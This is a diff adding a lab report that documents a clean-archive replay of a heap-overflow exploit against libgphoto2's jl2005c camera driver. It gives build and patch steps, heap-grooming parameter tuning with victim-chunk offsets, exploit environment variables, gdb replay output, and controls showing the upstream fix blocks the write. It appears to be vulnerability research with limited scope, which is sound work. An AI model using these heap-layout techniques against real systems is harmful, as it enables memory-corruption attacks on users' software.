@@ -1,0 +1,150 @@
+# W174 (2026-11-24): clean-archive replay of W172's real gphoto2 consumer write
+
+Author replay from committed bytes, NOT an independent witness verdict.
+Grade unchanged at rung 4. All paths below are relative to the repo root
+unless stated; the replay tree /tmp/w174-lgp is a throwaway directory.
+
+## Clean inputs
+
+  git archive 833729ad reports/frontier-libgphoto2shell.md \
+    lab/frontier/libgphoto2shell | tar -x -C /tmp/w174-lgp
+  115 files in archive
+  cd /tmp/w174-lgp
+  sha256sum -c lab/frontier/libgphoto2shell/PINS.sha256
+    pins/fix-6a3393d.patch: OK
+    pins/jl2005c.c.fixed: OK
+    pins/jl2005c.c.vuln: OK
+    pins/jl2005c.h.vuln: OK
+
+The release tarball is a provisioned artifact, not a Git file; the copy used
+was hashed against the recorded pin:
+  sha256 src/libgphoto2-2.5.34.tar.bz2
+    5df9e774eb4ab6087a193afff84dcafe9f666e3443fe29e73e6779f659ff7f28
+
+From T=/tmp/w174-lgp/lab/frontier/libgphoto2shell:
+  mkdir -p src && cp <repo>/.../src/libgphoto2-2.5.34.tar.bz2 src/
+  tar -xjf src/libgphoto2-2.5.34.tar.bz2 -C src
+  mv src/libgphoto2-2.5.34 src/libgphoto2-2.5.34-plain
+  cd src/libgphoto2-2.5.34-plain
+  patch -p1 < ../../live/vusb-jl2005.patch
+  patch -p1 < ../../evidence/replay-vusb-victim.patch
+  patch -p1 < ../../evidence/replay-vusb-normal-return.patch
+  patch -p1 < ../../evidence/replay-vusb-guards.patch
+  sha256 camlibs/jl2005c/jl2005c.c
+    0ccb1dac24a837bc58a414942cc74bec47586b826c6c0c91ddcec3adea3d6185
+  CFLAGS='-O0 -g -fPIC -fno-omit-frame-pointer' ./configure \
+    --prefix="$PWD/installdir-plain" --with-camlibs=jl2005c \
+    --enable-shared --disable-static --without-libxml-2.0 \
+    --without-libcurl --without-gdlib --without-libtiff-4 \
+    --without-libexif --disable-nls --enable-vusb
+  CFLAGS='-O0 -g -fPIC -fno-omit-frame-pointer' make -j4 && make install
+  P=$PWD/installdir-plain
+  gcc -O0 -g -rdynamic -fno-omit-frame-pointer -I"$P/include" \
+    -o ../../live/normal_return_probe ../../evidence/replay-normal_return_probe.c \
+    -L"$P/lib" -lgphoto2 -lgphoto2_port -Wl,-rpath,"$P/lib"
+
+The committed probe source is byte-identical to the working-tree probe used
+for W172 (sha256 ad514167db620dc4e2481d7e2aeaf024021663b55836d42fabdcdabfa26cfa98).
+
+## Drift found and fixed: DRAIN is environment-sensitive
+
+The W172 raw evidence used M2SHELL_VUSB_DRAIN=22 in the author's working tree.
+Replayed verbatim in the clean archive it gave priv=0x555555563ff0,
+victim=0x555555563cb0 (BEFORE priv), CONSUMER_GET data=(nil) size=0x0 and a
+0-byte save file -- no attack. In the working tree the same case had
+priv=0x555555564070, victim=0x5555555680c0 = priv+0x4050. The difference is
+the pre-existing 0x180 tcache population: startup/environment shifts the heap
+by 0x80 and changes which chunk the lab hook's drain loop leaves for
+gp_file_new(). Measured in the clean tree (same env, only DRAIN varied):
+
+  DRAIN   victim          note
+     8    0x5555555626d0  before priv
+    12    0x555555562d10  before priv
+    16    0x555555563350  before priv
+    20    0x555555563990  before priv
+    22    0x555555563cb0  before priv
+    23    0x555555568040  priv+0x4050 -- W172 layout
+    24    0x5555555681d0  one 0x190 chunk too far
+    26    0x5555555684f0
+    28    0x555555568810
+    32    0x555555568e50
+    40    0x555555569ad0
+
+Decision: re-tune DRAIN to 23 in the replay recipe. The victim offset is the
+observable criterion, not the number: victim must be priv+0x4050 for the
+:154 overflow (starting at priv+0x4040) to reach the live CameraFile fields.
+No source, pin, patch or harness change. This is a replay-environment fix,
+not a new exploit primitive.
+
+## Six cases from the clean tree (DRAIN=23)
+
+Common run env from T:
+  P=$PWD/src/libgphoto2-2.5.34-plain/installdir-plain
+  CAMLIBS=$P/lib/libgphoto2/2.5.34
+  IOLIBS=$P/lib/libgphoto2_port/0.12.2
+  IOLIBS_PREFIX=vusb LD_LIBRARY_PATH=$P/lib
+  M2SHELL_JL2005_VUSB=v M2SHELL_JL2005_COUNT=1022
+  M2SHELL_VUSB_DRAIN=23 M2SHELL_VUSB_GUARDS=4
+  M2SHELL_VUSB_RESTORE_CALLER_CANARY=1 M2SHELL_VUSB_ACCESSTYPE=0
+  M2SHELL_TRY_SAVE=1 M2SHELL_DEBUG=1
+  gdb -q -batch -x evidence/replay-normal-return.gdb \
+    ./live/normal_return_probe usb:001,001
+The probe derives its own %fs:0x28 canary, saved registers from the live
+stack, and M2SHELL_VUSB_DATA from its own marker address; gdb only calls
+setenv-style helpers in the replay script (no memory writes).
+
+A23 attack, guards=4:
+  VUSB_VICTIM 0x555555568040
+  VUSB_GUARDS 4 first=0x5555555681d0 last=0x555555568680
+  GP_CAMERA_INIT rc=0
+  VICTIM_AT_CONSUMER+158 = 0x000000000000001d
+  VICTIM_AT_CONSUMER+160 = 0x0000555555556010
+  CONSUMER_GET rc=0 data=0x555555556010 size=0x1d
+  DEREF_READBACK bytes=29 text=M2SHELL_DEREF_MARKER_20261124
+  CONSUMER_SAVE rc=0 path=/tmp/m2s-deref-1735011.bin
+  NORMAL_RETURN_COMPLETE; gdb inferior exited normally
+  file 29 bytes, sha256 prefix d56174c2482345d0
+  00000000: 4d 32 53 48 45 4c 4c 5f 44 45 52 45 46 5f 4d 41  M2SHELL_DEREF_MA
+  00000010: 52 4b 45 52 5f 32 30 32 36 31 31 32 34           RKER_20261124
+
+B23 matched guard control (only M2SHELL_VUSB_GUARDS=0):
+  VUSB_VICTIM 0x555555568040
+  GP_CAMERA_INIT rc=0
+  CONSUMER_GET rc=0 data=0x555555556010 size=0x1d
+  DEREF_READBACK bytes=29 text=M2SHELL_DEREF_MARKER_20261124
+  malloc(): corrupted top size
+  Program received signal SIGABRT, Aborted
+  /tmp/m2s-deref-1735240.bin: 0 bytes
+  Guards are causal; the same API write aborts without them.
+
+C23 safe input M2SHELL_JL2005_COUNT=100, guards=4:
+  GP_CAMERA_INIT rc=0; CONSUMER_SKIP no victim; NORMAL_RETURN_COMPLETE
+
+D23 zero pointer/size M2SHELL_VUSB_DATA=0 M2SHELL_VUSB_SIZE=0, guards=4:
+  VUSB_VICTIM 0x555555567cd0; GP_CAMERA_INIT rc=0
+  CONSUMER_GET rc=0 data=(nil) size=0x0
+  DEREF_SKIP no usable pointer; NORMAL_RETURN_COMPLETE
+  save file 0 bytes
+
+E23 fixed camlib: apply ../../pins/fix-6a3393d.patch in the source tree,
+  CFLAGS='-O0 -g -fPIC -fno-omit-frame-pointer' make -j4 && make install:
+  only the 16 one-byte handshake reads and the 512-byte block, no
+  oversized bulk read, no VUSB_VICTIM line
+  GP_CAMERA_INIT rc=0; CONSUMER_SKIP no victim; NORMAL_RETURN_COMPLETE
+
+F23 fix reversed (patch -R -p1), camlib rebuilt:
+  VUSB_VICTIM 0x555555568040; VUSB_GUARDS 4 first=0x5555555681d0
+  CONSUMER_GET rc=0 data=0x555555556010 size=0x1d
+  DEREF_READBACK bytes=29 text=M2SHELL_DEREF_MARKER_20261124
+  CONSUMER_SAVE rc=0 path=/tmp/m2s-deref-1742495.bin
+  file 29 bytes, sha256 prefix d56174c2482345d0; NORMAL_RETURN_COMPLETE
+
+## Scope
+
+Clean-archive replay removes the "working-tree-only artifact" gap for W172.
+It is still an author replay using a lab-patched vusb port, synthetic replies,
+a lab-placed victim/guards, a probe-supplied pointer and gdb-restored canary
+and saved registers. No physical USB, USB/IP, wire request from a remote
+party, device-only canary recovery, command execution or witness verdict.
+Rung 4 only; rung 5 UNKNOWN. Per-run raw logs A23.log..F23.log live in the
+throwaway replay tree, not in Git; the figures above are copied from them.
